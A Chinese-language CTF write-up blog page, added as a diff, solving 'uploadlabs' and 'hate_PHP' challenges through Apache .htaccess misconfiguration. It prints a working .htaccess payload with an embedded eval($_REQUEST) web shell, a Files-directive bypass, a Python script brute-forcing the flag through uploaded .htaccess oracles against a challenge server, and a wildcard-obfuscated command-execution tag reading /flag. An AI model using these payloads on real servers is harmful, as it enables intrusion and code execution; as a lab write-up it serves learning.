@@ -1,0 +1,231 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>uploadlabs - 月出从云</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="知识点：apache文件配置
+思路：这道题目放出了源码，通过源码的配置我们是可以看见的：
+12345678&amp;lt;Directory /var/www/&amp;gt;	Options  Indexes F,"> 
+    
+    <link rel="alternative" href="atom.xml" title="月出从云" type="application/atom+xml"> 
+    <link rel="icon" href="/img/1.ico"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">月出从云</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">uploadlabs</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">uploadlabs</h1>
+        <div class="stuff">
+            <span>五月 11, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Apache/" rel="tag">Apache</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/PHP/" rel="tag">PHP</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h1><p>apache文件配置</p>
+<h1 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h1><p>这道题目放出了源码，通过源码的配置我们是可以看见的：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Directory</span> /<span class="attr">var</span>/<span class="attr">www</span>/&gt;</span></span><br><span class="line">	Options  Indexes FollowSymLinks</span><br><span class="line">	AllowOverride All </span><br><span class="line">	Require all granted</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Directory</span> ~ &quot;/<span class="attr">var</span>/<span class="attr">www</span>/<span class="attr">html</span>/<span class="attr">upload</span>/[<span class="attr">a-f0-9</span>]&#123;<span class="attr">32</span>&#125;/&quot;&gt;</span></span><br><span class="line">        php_flag engine off</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>自己做题的时候因为没有接触过类似的题目，，apahce的文件配置，所以做题的时候一直上传.htaccess修改为</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Directory</span> ~ &quot;/<span class="attr">var</span>/<span class="attr">www</span>/<span class="attr">html</span>/<span class="attr">upload</span>/[<span class="attr">a-f0-9</span>]&#123;<span class="attr">32</span>&#125;/&quot;&gt;</span></span><br><span class="line">        php_flag engine on</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>结果还是没用【】</p>
+<h1 id="官方WP："><a href="#官方WP：" class="headerlink" title="官方WP："></a>官方WP：</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Files</span> <span class="attr">.htaccess</span>&gt;</span></span><br><span class="line">ForceType application/x-httpd-php</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">Require all granted</span><br><span class="line">php_flag engine on</span><br><span class="line"><span class="tag">&lt;/<span class="name">Files</span>&gt;</span></span><br><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le .htaccess</span><br><span class="line">#<span class="tag">&lt;<span class="name">?php</span> <span class="attr">eval</span>($<span class="attr">_REQUEST</span>[<span class="attr">0</span>])?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是官方对于具体原理并没有做出解释，尝试去看看apache的配置解说</p>
+<p><img src="uploadlabs/image-20210511103047201.png" alt="image-20210511103047201"></p>
+<p>上面一段的php文件也就说明我们的每个文件都会被当作PHP来解析，并且会被加入一句话木马</p>
+<p><img src="uploadlabs/image-20210511103945580.png" alt="image-20210511103945580"></p>
+<h1 id="HA1C9ON师傅的"><a href="#HA1C9ON师傅的" class="headerlink" title="HA1C9ON师傅的"></a>HA1C9ON师傅的</h1><p>其实apahce的官方文档中有这么一句话：</p>
+<p><img src="uploadlabs/image-20210511104126805.png" alt="image-20210511104126805"></p>
+<p>这段的意思是告诉我们files标签的优先级要更高，故我们可以通过:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Files</span> &#x27;<span class="attr">1.php</span>&#x27;&gt;</span></span><br><span class="line">	php_flag engine on</span><br><span class="line"><span class="tag">&lt;/<span class="name">Files</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>再上传一个1.php即可</p>
+<p><img src="uploadlabs/image-20210511104548814.png" alt="image-20210511104548814"></p>
+<p>var_dump(file_get_contents(‘/flag’));</p>
+<h1 id="Nu1L"><a href="#Nu1L" class="headerlink" title="Nu1L"></a>Nu1L</h1><p>这个思路实在是太骚了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">ip = requests.get(<span class="string">&#x27;http://118.24.185.108/ip.php&#x27;</span>).text</span><br><span class="line">print(ip)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">a</span>):</span></span><br><span class="line">    f = <span class="string">&#x27;&#x27;&#x27;&lt;If &quot;file(&#x27;/flag&#x27;)=~ /&#x27;&#x27;&#x27;</span>+a+<span class="string">&#x27;&#x27;&#x27;/&quot;&gt;</span></span><br><span class="line"><span class="string">    ErrorDocument 404 &quot;wupco&quot;</span></span><br><span class="line"><span class="string">    &lt;/If&gt;</span></span><br><span class="line"><span class="string">     &#x27;&#x27;&#x27;</span></span><br><span class="line">    print(f)</span><br><span class="line">    resp = requests.post(<span class="string">&quot;http://122.112.248.222:20003/index.php?id=167&quot;</span>,data=&#123;<span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;submit&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;.htaccess&#x27;</span>,f)&#125; )</span><br><span class="line">    a = requests.get(<span class="string">&quot;http://122.112.248.222:20003/upload/&quot;</span>+ip+<span class="string">&quot;/a&quot;</span>).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;wupco&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line">c = string.ascii_letters + string.digits + <span class="string">&quot;\&#123;\&#125;&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;checking: &quot;</span>+ flag+i)</span><br><span class="line">        <span class="keyword">if</span> check(flag+i):</span><br><span class="line">            flag = flag+i</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
+
+<p>通过修改apahce的404显示页面，注入得到flag。</p>
+<p>自己想到的一个思路，但是不知道为什么无论如何都是500.</p>
+<p>根据别人的说法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;my.oschina.net&#x2F;mejinke&#x2F;blog&#x2F;49450</span><br></pre></td></tr></table></figure>
+
+<p>修改apache2的配置的话是可以使得HTML包含其他页面的，但是一直会失败，不知道有师傅是否能够成功</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Directory</span> /&gt;</span></span><br><span class="line">   Options FollowSymLinks</span><br><span class="line">   AllowOverride None</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Directory</span> <span class="attr">D:</span>/<span class="attr">www</span>&gt;</span></span><br><span class="line">   AddType text/html .shtml .html .htm</span><br><span class="line">   AddOutputFilter INCLUDES .shtml .html .htm</span><br><span class="line">   Options Indexes FollowSymLinks MultiViews Includes ExecCGI</span><br><span class="line">   AllowOverride All</span><br><span class="line">   Order allow,deny</span><br><span class="line">   allow from all</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="hate-PHP"><a href="#hate-PHP" class="headerlink" title="hate_PHP"></a>hate_PHP</h1><p>这个题目就是安恒月赛- -</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_30387423&#x2F;article&#x2F;details&#x2F;99558868</span><br></pre></td></tr></table></figure>
+
+
+
+<p>知识点：</p>
+<p>/bin/cat 就是cat命令，所以我们可以</p>
+<p>这样就读取到flag了= =</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&gt;&lt;?=`/???/??? /????`;?&gt;</span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r='https://github.com/ysllz/ysllz.github.io'
+        data-o='https://github.com/ysllz/ysllz.github.io'
+        data-a='ysllz'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">知识点：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">思路：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%98%E6%96%B9WP%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">官方WP：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HA1C9ON%E5%B8%88%E5%82%85%E7%9A%84"><span class="toc-number">4.</span> <span class="toc-text">HA1C9ON师傅的</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Nu1L"><span class="toc-number">5.</span> <span class="toc-text">Nu1L</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#hate-PHP"><span class="toc-number">6.</span> <span class="toc-text">hate_PHP</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
